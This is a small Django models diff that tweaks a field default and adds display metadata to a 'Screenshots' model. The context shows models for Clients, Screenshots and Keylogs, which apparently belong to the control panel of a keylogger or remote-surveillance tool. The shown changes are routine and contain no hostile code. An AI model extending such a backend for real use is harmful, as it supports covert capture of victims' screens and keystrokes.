@@ -23,7 +23,7 @@ class Clients(models.Model):
     moderator_id = models.ForeignKey(Moderators)
     identifier = models.CharField(max_length=100)
     alias = models.CharField(max_length=100, default='')
-    note = models.TextField(default='')
+    note = models.TextField(blank=True)
     ip_address = models.CharField(max_length=100)
     last_online = models.DateTimeField(default=timezone.now)
     status = models.BooleanField(default=False)
@@ -42,6 +42,12 @@ class Screenshots(models.Model):
     title_name = models.CharField(max_length=1000)
     date = models.DateTimeField(default=timezone.now)
     viewed = models.BooleanField(default=False)
+
+    def __unicode__(self):
+        return self.client_id.identifier
+
+    class Meta:
+        verbose_name = "Screenshot"
 
 
 class Keylogs(models.Model):
